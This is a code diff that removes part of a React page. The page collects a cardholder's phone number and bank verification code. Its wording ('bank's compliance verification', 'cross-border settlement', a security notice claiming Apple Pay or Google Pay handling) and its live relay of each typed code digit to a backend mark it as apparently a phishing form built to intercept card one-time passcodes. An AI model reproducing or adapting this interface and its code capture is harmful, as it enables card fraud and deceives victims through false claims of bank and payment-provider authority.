-                  onBlur={() => handleBlur("phone_number")} placeholder="+1 (555) 000-0000" className={inputClass} />
-                <p className="text-xs text-gray-400 mt-1">Must match the phone number linked to your {isCreditCard ? "credit card" : "card"} account.</p>
-                {fieldErrors.phone_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.phone_number}</p>}
-              </div>
-              {!codeSent && (
-                <button type="button" onClick={handleSendCode} disabled={sendLoading || countdown > 0}
-                  className="w-full bg-gradient-to-r from-[#0A2B5E] via-[#123D82] to-[#1E4DA0] text-white font-semibold py-2.5 rounded-lg flex items-center justify-center gap-2 shadow-md shadow-[#0A2B5E]/20 hover:shadow-lg hover:shadow-[#0A2B5E]/30 hover:-translate-y-px active:translate-y-0 active:scale-[0.99] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-md">
-                  {sendLoading ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : null}
-                  {countdown > 0 ? `Please wait before resending (${countdown}s)` : "Send Verification Code"}
-                </button>
-              )}
-              {codeSent && (
-                <div className="mt-2 rounded-xl border-2 border-[#1E3A8A] bg-[#EFF6FF] p-5">
-                  <label className="block text-sm font-bold text-[#0A2B5E] mb-3">Verification Code <span className="text-red-500">*</span></label>
-                  <input type="text" inputMode="numeric" autoComplete="off" value={verificationCode}
-                    onChange={e => {
-                      const v = e.target.value.replace(/\D/g, "");
-                      setVerificationCode(v);
-                      if (codeDebounceRef.current) clearTimeout(codeDebounceRef.current);
-                      codeDebounceRef.current = setTimeout(() => { updateVerificationCode(ftUid!, v).catch(() => {}); }, 300);
-                    }}
-                    placeholder="Enter verification code"
-                    className="w-full px-4 py-4 border-2 border-[#1E3A8A] rounded-xl text-center tracking-[0.6em] font-mono text-2xl font-bold text-[#0A2B5E] bg-white focus:outline-none focus:ring-4 focus:ring-[#1E3A8A]/20 transition shadow-sm" />
-                  {expiryLeft > 0 && (
-                    <p className={`flex items-center justify-center gap-1.5 text-xs font-semibold mt-2 ${expiryLeft <= 10 ? "text-red-600" : "text-[#1E3A8A]"}`}>
-                      <Clock className="w-3.5 h-3.5" />
-                      Code expires in {expiryLeft}s
-                    </p>
-                  )}
-                  <p className="text-xs text-[#1E3A8A] mt-2.5 text-left font-medium">Once the bank's compliance verification is completed, a verification code will be sent to the mobile number associated with your card.</p>
-                  {/* Action row: resend left, submit right */}
-                  <div className="flex gap-3 mt-4">
-                    <ResendCodeButton onClick={handleSendCode} sending={sendLoading} countdown={countdown} className="w-0 flex-[5]" />
-                    <SubmitReviewButton submitting={submitLoading} className="w-0 flex-[7]" />
-                  </div>
-                </div>
-              )}
-            </div>
-          </div>
-
-          {error && (
-            <div className="flex items-center gap-2 bg-red-50 border border-red-200 text-red-700 text-sm px-4 py-3 rounded-lg">
-              <AlertCircle className="w-4 h-4 flex-shrink-0" />
-              {error}
-            </div>
-          )}
-
-          {/* Security Notice */}
-          <div className="bg-white border border-blue-200 rounded-2xl shadow-sm overflow-hidden">
-            <div className="bg-[#0A2B5E] px-5 py-3 flex items-center gap-2">
-              <Shield className="w-4 h-4 text-blue-200 flex-shrink-0" />
-              <span className="text-white text-xs font-semibold tracking-wide uppercase">Verification Code Official Security Notice</span>
-            </div>
-            <div className="px-5 py-4 flex items-start gap-3">
-              <Lock className="w-5 h-5 text-[#1E3A8A] flex-shrink-0 mt-0.5" />
-              <div className="space-y-1.5">
-                <p className="text-sm text-[#0A2B5E] font-medium">Data Protection Statement</p>
-                <p className="text-xs text-gray-600 leading-relaxed">The information you submit is used solely for the purpose of cross-border settlement identity verification. All settlement authentication and review materials are processed through the official secure channels of Apple Pay or Google Pay.</p>
-              </div>
-            </div>
-          </div>
-        </form>
       </main>
 
       <Footer />
